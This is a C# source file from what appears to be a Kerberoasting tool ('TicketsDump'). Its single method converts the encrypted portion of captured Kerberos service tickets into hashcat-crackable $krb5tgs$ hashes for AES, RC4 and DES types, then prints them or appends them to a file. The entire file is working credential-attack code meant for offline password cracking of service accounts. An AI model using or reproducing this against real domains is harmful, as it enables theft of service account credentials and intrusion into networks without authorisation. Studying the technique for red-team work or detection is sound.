using System;
using Asn1;
using System.IO;
using ConsoleTables;
using System.Text.RegularExpressions;
using System.Security.Principal;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Collections.Generic;
using TicketsDump.lib.Interop;

namespace TicketsDump
{
    public class Roast
    {
       
        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false, string desPlainText = "")
        {
            // output the hash of the encrypted KERB-CRED service ticket in a kerberoast hash form

            int encType = cred.tickets[0].enc_part.etype;
            string userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
            string domainName = cred.enc_part.ticket_info[0].prealm;
            string sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());

            string cipherText = BitConverter.ToString(cred.tickets[0].enc_part.cipher).Replace("-", string.Empty);

            string hash = "";
            //Aes needs to be treated differently, as the checksum is the last 24, not the first 32.
            if ((encType == 18) || (encType == 17))
            {
                int checksumStart = cipherText.Length - 24;
                //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.            
                hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
            }
            else if (encType == 3 && !string.IsNullOrWhiteSpace(desPlainText))
            {
                hash = Crypto.FormDESHash(cipherText, Helpers.StringToByteArray(desPlainText));
            }
            //if encType==23
            else
            {
                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
            }

            if (!String.IsNullOrEmpty(outFile))
            {
                string outFilePath = Path.GetFullPath(outFile);
                try
                {
                    File.AppendAllText(outFilePath, hash + Environment.NewLine);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception: {0}", e.Message);
                }
                Console.WriteLine("[*] Hash written to {0}", outFilePath);
            }
            else if (simpleOutput)
            {
                Console.WriteLine(hash);
            }
            else
            {
                bool header = false;
                if (Program.wrapTickets)
                {
                    foreach (string line in Helpers.Split(hash, 80))
                    {
                        if (!header)
                        {
                            if (kerberoastDisplay)
                            {
                                Console.WriteLine("[*] Hash                   : {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("  Kerberoast Hash          :  {0}", line);
                            }
                        }
                        else
                        {
                            if (kerberoastDisplay)
                            {
                                Console.WriteLine("                             {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("                           {0}", line);
                            }
                        }
                        header = true;
                    }
                }
                else
                {
                    if (kerberoastDisplay)
                    {
                        Console.WriteLine("[*] Hash                   : {0}", hash);
                    }
                    else
                    {
                        Console.WriteLine("  Kerberoast Hash          :  {0}", hash);
                    }
                }
            }
        }
        
    }
}
